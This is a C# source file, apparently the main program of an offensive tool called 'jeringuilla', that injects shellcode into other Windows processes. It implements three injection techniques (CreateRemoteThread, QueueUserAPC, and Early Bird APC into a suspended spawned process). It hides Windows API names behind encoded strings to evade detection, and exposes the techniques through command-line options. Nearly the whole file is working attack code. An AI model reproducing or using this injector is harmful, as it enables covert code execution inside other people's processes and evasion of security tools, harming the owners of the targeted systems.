using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

using static jeringuilla.Win32;
using static jeringuilla.HelperFunctions;
using static jeringuilla.PayloadFunctions;
using static jeringuilla.ProcessFunctions;


namespace jeringuilla
{
    class Program
    {
        static void injectShellcodeCreateRemoteThread(String processPID, String payload)
        {
            // Function delegates
            IntPtr k32 = GetLibAddress("1GAd1/G7gM4sph/yC0uQLg==");
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)GetFuncDelegate(k32, "ZlWSQ5AeZIU0Z/vLWqlQmw==", typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)GetFuncDelegate(k32, "3VykPNLrF3zOBfq50x+yew==", typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)GetFuncDelegate(k32, "/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", typeof(WriteProcessMemoryDelegate));
            CreateRemoteThreadDelegate auxCreateRemoteThread = (CreateRemoteThreadDelegate)GetFuncDelegate(k32, "EcLQmi+4wHc4weGwjNgqCQe+1LyC2VMgE3xKs7JyhZY=", typeof(CreateRemoteThreadDelegate));

            // Get payload
            byte[] buf = getPayload(payload);

            // Create handle to process
            Process process = Process.GetProcessById(Int32.Parse(processPID));
            String processname = process.ProcessName;
            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
            if (hProcess != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process {0} (\"{1}\") created correctly.", processPID, processname);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" is NULL.", processPID, processname);
            }
            // Call VirtualAllocEx
            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            // Call WriteProcessMemory
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
            // Call CreateRemoteThread
            IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }


        static void injectShellcodeQueueUserAPC(String processPID, String payload)
        {
            // Function delegates
            IntPtr k32 = GetLibAddress("1GAd1/G7gM4sph/yC0uQLg==");
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)GetFuncDelegate(k32, "ZlWSQ5AeZIU0Z/vLWqlQmw==", typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)GetFuncDelegate(k32, "3VykPNLrF3zOBfq50x+yew==", typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)GetFuncDelegate(k32, "/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)GetFuncDelegate(k32, "cd7xBomTOk7mvZ7UxBJDaQ==", typeof(QueueUserAPCDelegate));
            OpenThreadDelegate auxOpenThread = (OpenThreadDelegate)GetFuncDelegate(k32, "ATZJvFQXpEJm5R5ff90mOA==", typeof(OpenThreadDelegate));

            // Get payload
            byte[] buf = getPayload(payload);

            // Create handle to process
            Process process = Process.GetProcessById(Int32.Parse(processPID));
            String processname = process.ProcessName;
            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
            if (hProcess != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process {0} (\"{1}\") created correctly.", processPID, processname);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" is NULL.", processPID, processname);
            }
            // Call VirtualAllocEx
            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
            // Call WriteProcessMemory
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
            ProcessThread hThread = Process.GetProcessById(Int16.Parse(processPID)).Threads[0];
            IntPtr hThreadId = auxOpenThread(0x0010, false, (uint)hThread.Id);
            // Call QueueUserAPC
            auxQueueUserAPC(addr, hThreadId, 0);
        }


        static void injectShellcodeEarlyBird(String processname, String payload)
        {
            // Function delegates
            IntPtr k32 = GetLibAddress("1GAd1/G7gM4sph/yC0uQLg=="); 
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)GetFuncDelegate(k32, "3VykPNLrF3zOBfq50x+yew==", typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)GetFuncDelegate(k32, "/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)GetFuncDelegate(k32, "cd7xBomTOk7mvZ7UxBJDaQ==", typeof(QueueUserAPCDelegate));
            CreateProcessDelegate auxCreateProcess = (CreateProcessDelegate)GetFuncDelegate(k32, "2FXtT/hu7ZEj8oz79680TQ==", typeof(CreateProcessDelegate));
            ResumeThreadDelegate auxResumeThread = (ResumeThreadDelegate)GetFuncDelegate(k32, "uINo0LSuz3QttywZS2AsBw==", typeof(ResumeThreadDelegate));

            // Get payload
            byte[] buf = getPayload(payload);

            // Create Suspended process. Source: https://www.codeproject.com/Articles/230005/Launch-a-process-suspended
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            var pi = new PROCESS_INFORMATION();
            bool success = auxCreateProcess(processname, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine("[+] Trying to spawn a suspended process for " + processname);
            if (success)
            {
                Console.WriteLine("[+] Process created correctly");
            }
            else
            {
                Console.WriteLine("[-] Process failed to create");
                System.Environment.Exit(0);
            }
            Console.WriteLine("[+] Process PID: " + pi.dwProcessId);
            Console.WriteLine("[+] Thread ID:   " + pi.dwThreadId);
            // Call VirtualAllocEx
            var baseAddress = auxVirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x20);
            // Call WriteProcessMemory
            auxWriteProcessMemory(pi.hProcess, baseAddress, buf, buf.Length, out _);
            // Call QueueUserAPC
            auxQueueUserAPC(baseAddress, pi.hThread, 0);
            // Call ResumeThread
            auxResumeThread(pi.hThread);
        }


        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                getHelp();
            }

            string option = args[0];
            string process_str = args[1];

            if (option == "list")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                listInfo(processPIDs);

            }

            else if (option == "inject-crt")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeCreateRemoteThread(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeCreateRemoteThread(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "inject-apc")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeQueueUserAPC(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeQueueUserAPC(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "earlybird")
            {
                string payload;
                if (args.Length == 3)
                {
                    payload = args[2];
                }
                else
                {
                    payload = null;
                }
                injectShellcodeEarlyBird(process_str, payload);
            }
        }

    }

}